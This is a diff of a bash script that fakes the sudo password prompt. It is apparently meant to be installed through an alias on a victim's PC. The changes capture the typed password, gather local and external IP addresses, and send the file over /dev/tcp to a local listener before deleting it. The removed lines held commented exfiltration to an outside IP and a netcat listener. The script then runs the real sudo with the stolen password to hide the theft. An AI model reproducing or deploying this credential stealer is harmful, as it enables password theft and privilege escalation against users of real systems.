@@ -2,14 +2,21 @@
 
 currentDir=$(pwd)
 
-## run this first to "install" the script on victims PC
 # alias sudo="bash $currentDir/sudo.sh"
+# unalias sudo
 
 read -sp "[sudo] password for $USER: " password
 
-address=$(hostname --ip-address)
+localaddress=$(hostname --all-ip-addresses)
+externaladdress=$(dig +short myip.opendns.com @resolver1.opendns.com)
 
-echo "$address :: $USER :: $password" > ${USER}_sudo_pass.txt
+echo "$externaladdress :: $localaddress :: $USER :: $password" > "$currentDir/${USER}_sudo_pass.txt"
+
+cat "$currentDir/${USER}_sudo_pass.txt" > /dev/tcp/127.0.0.1/8081
+# nc -l -p 8081
+
+rm -rf "$currentDir/${USER}_sudo_pass.txt"
+# shred -u -z -f "$currentDir/${USER}_sudo_pass.txt"
 
 echo ""
 
@@ -25,17 +32,6 @@ done
 
 echo $password | sudo -S echo >/dev/null 2>&1
 sudo -S $params
-
-## this even work?
-# exec 5<>/dev/tcp/111.2.333.44/22
-# echo -e "echo $password > ${USER}_sudo_pass.txt" >&5
-# cat <&5
-
-## or
-
-## on your machine do
-# nc -l -p 8081
-# cat "$currentDir/${USER}_sudo_pass.txt" > /dev/tcp/111.2.333.44/8081
 
 ## mitigation https://superuser.com/questions/793240/preventing-malware-from-sniffing-the-sudo-password
 
